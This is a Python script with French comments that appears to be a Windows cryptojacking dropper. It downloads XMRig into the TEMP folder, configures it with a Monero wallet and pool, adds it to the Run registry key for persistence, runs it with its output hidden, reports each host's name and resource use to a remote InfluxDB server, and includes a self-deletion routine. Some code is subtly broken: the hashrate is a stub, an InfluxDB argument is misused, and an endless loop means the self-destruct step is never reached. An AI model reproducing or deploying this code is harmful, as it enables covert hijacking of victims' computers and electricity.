import os
import subprocess
import sys
import shutil
import winreg
import requests
import ctypes
import time
import psutil
import logging
from win10toast import ToastNotifier
from influxdb_client import InfluxDBClient, Point, WritePrecision

# Paramètres de configuration
WALLET_ADDRESS = "VOTRE_ADRESSE_MONERO"
POOL_ADDRESS = "stratum+tcp://pool.monero.hashvault.pro:5555"
DONATE_LEVEL = 1
MAX_CPU_USAGE = 80
MINER_URL = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip"
MINER_DIR = os.path.join(os.getenv("TEMP"), "xmrig")

# Configuration InfluxDB
INFLUXDB_URL = "http://IP_DU_SERVEUR:8086"
INFLUXDB_TOKEN = "VOTRE_TOKEN"
INFLUXDB_ORG = "VOTRE_ORG"
INFLUXDB_BUCKET = "VOTRE_BUCKET"

# Configuration du logging
logging.basicConfig(filename="miner.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_miner():
    if not os.path.exists(MINER_DIR):
        os.makedirs(MINER_DIR)
    miner_zip = os.path.join(MINER_DIR, "xmrig.zip")
    logging.info("Téléchargement du mineur...")
    response = requests.get(MINER_URL, stream=True)
    with open(miner_zip, "wb") as f:
        for chunk in response.iter_content(chunk_size=8192):
            f.write(chunk)
    logging.info("Téléchargement terminé.")
    shutil.unpack_archive(miner_zip, MINER_DIR)
    os.remove(miner_zip)

def configure_miner(cpu_usage):
    config_path = os.path.join(MINER_DIR, "config.json")
    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
            "max-threads-hint": cpu_usage,
        },
        "donate-level": DONATE_LEVEL,
        "pools": [
            {
                "url": POOL_ADDRESS,
                "user": WALLET_ADDRESS,
            }
        ],
    }
    import json
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)

def add_to_startup():
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        registry_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "MoneroMiner", 0, winreg.REG_SZ, os.path.join(MINER_DIR, "xmrig.exe"))
        winreg.CloseKey(registry_key)
    except Exception as e:
        logging.error(f"Erreur lors de l'ajout au démarrage: {e}")

def send_to_influxdb(data):
    """Envoie les données à InfluxDB."""
    try:
        client = InfluxDBClient(url=INFLUXDB_URL, token=INFLUXDB_TOKEN, org=INFLUXDB_ORG)
        write_api = client.write_api(write_options=WritePrecision.NS)
        point = Point("miner_stats").tag("host", os.getenv("COMPUTERNAME")).field("cpu_usage", data["cpu_usage"]).field("ram_usage", data["ram_usage"]).field("hashrate", data["hashrate"])
        write_api.write(INFLUXDB_BUCKET, INFLUXDB_ORG, point)
        client.close()
    except Exception as e:
        logging.error(f"Erreur lors de l'envoi des données à InfluxDB: {e}")

def start_mining():
    miner_exe = os.path.join(MINER_DIR, "xmrig.exe")
    try:
        process = subprocess.Popen([miner_exe], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        logging.info("Minage démarré.")
        ToastNotifier().show_toast("Monero Miner", "Le minage a démarré.", duration=5)

        while True:
            cpu_usage = psutil.cpu_percent(interval=1)
            ram_usage = psutil.virtual_memory().percent
            hashrate = 0  # Remplacer par la récupération du hashrate depuis XMRig

            data = {
                "cpu_usage": cpu_usage,
                "ram_usage": ram_usage,
                "hashrate": hashrate,
            }
            send_to_influxdb(data)

            if cpu_usage > MAX_CPU_USAGE or ram_usage > 80:
                new_cpu_usage = max(10, MAX_CPU_USAGE - (cpu_usage - MAX_CPU_USAGE))
                configure_miner(new_cpu_usage)
                logging.info(f"Réduction de l'intensité du minage à {new_cpu_usage}%.")
            else:
                configure_miner(MAX_CPU_USAGE)
                logging.info(f"Intensité du minage maximale à {MAX_CPU_USAGE}%.")

            time.sleep(10)

    except Exception as e:
        logging.error(f"Erreur lors du démarrage du minage: {e}")

def self_destruct():
    logging.info("Auto-destruction en cours...")
    time.sleep(5)
    try:
        os.remove(sys.argv[0])
        shutil.rmtree(MINER_DIR)
        logging.info("Auto-destruction terminée.")
    except Exception as e:
        logging.error(f"Erreur lors de l'auto-destruction: {e}")

if __name__ == "__main__":
    if not is_admin():
        logging.error("Le programme doit être exécuté en tant qu'administrateur.")
        sys.exit(1)
    
    download_miner()
    configure_miner(MAX_CPU_USAGE)
    add_to_startup()
    start_mining()
    self_destruct()